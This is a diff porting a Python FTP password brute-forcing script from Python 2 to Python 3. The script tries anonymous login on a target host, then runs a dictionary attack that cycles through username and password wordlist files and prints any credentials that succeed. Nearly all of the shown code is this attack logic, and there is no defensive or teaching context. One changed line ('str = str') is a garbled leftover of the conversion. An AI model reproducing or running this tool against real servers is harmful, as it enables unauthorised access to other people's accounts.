@@ -9,7 +9,7 @@ import sys
 
 if sys.version_info[0] >= 3:
 	raw_input = input
-unicode = str
+str = str
 
 def connect(host, user, password):
     try:
@@ -74,11 +74,11 @@ def dictAttack(target,username,passwords,maxlines):
             password = line.strip('\r\n')
             # percent = round((i * pl + (j + 1)) * 100 / maxlines, 4)
             percent = round((j + 1) * 100 / maxlines, 4)
-            print 'Testing (' + str("%.4f" % percent) + '%):' + str(username) + ' with ' + str(password)
+            print('Testing (' + str("%.4f" % percent) + '%):' + str(username) + ' with ' + str(password))
             if connect(target, username, password):
                 # Password Found
-                print '[+] FTP logon succeeded on host ' + target + " UserName: " + username + \
-                      ", Password: " + str(password)
+                print('[+] FTP logon succeeded on host ' + target + " UserName: " + username + \
+                      ", Password: " + str(password))
                 exit(0)
                 # else:
                 # print '[+] FTP Logon failed on host ' + targetAddress + " UserName: " + username + \
@@ -90,36 +90,36 @@ def main():
     assert targetAddress != '', 'Target cannot be Empty'
 
     # Try to connect using anonymous logon
-    print '[+] Using anonymous credentials for ' + targetAddress
+    print('[+] Using anonymous credentials for ' + targetAddress)
     if connect(targetAddress, 'anonymous', 'klain@main.com'):
-        print '[+] FTP Anonymous log on succeeded on host ' + targetAddress
+        print('[+] FTP Anonymous log on succeeded on host ' + targetAddress)
     else:
-        print '[+] FTP Anonymous log on failed on host ' + targetAddress
+        print('[+] FTP Anonymous log on failed on host ' + targetAddress)
         # Try Brute Force using dictionary file
-        print '[+] Starting Dictionary Attack '
+        print('[+] Starting Dictionary Attack ')
 
         # Choose single user mode
         if singleuser != '' and usernameFilePath == '':
-            print '[+] Starting attack on user ' + str(singleuser)
-            print '[+] Calculating total combinations ...'
+            print('[+] Starting attack on user ' + str(singleuser))
+            print('[+] Calculating total combinations ...')
             maxlines = get_len(passFilePath)
-            print str("%.0f" % maxlines)
+            print(str("%.0f" % maxlines))
             dictAttack(targetAddress, singleuser, passFilePath, maxlines)
 
         elif usernameFilePath != '' and singleuser == '':
-            print '[+] Starting attack on multiple users '
-            print '[+] Calculating total combinations ...'
+            print('[+] Starting attack on multiple users ')
+            print('[+] Calculating total combinations ...')
             ul = get_len(usernameFilePath)
             pl = get_len(passFilePath)
             maxlines = float(ul * pl)
-            print str("%.0f" % maxlines)
+            print(str("%.0f" % maxlines))
             with open(usernameFilePath, 'r') as usernameFile:
                 for user in usernameFile.readlines():
                     username = user.strip('\r\n')
                     dictAttack(targetAddress, username, passFilePath,maxlines)
-                    print '[+] No password found for user ' + user
+                    print('[+] No password found for user ' + user)
         else:
-            print 'Check your parameters and try again'
+            print('Check your parameters and try again')
             exit(100)
 
 
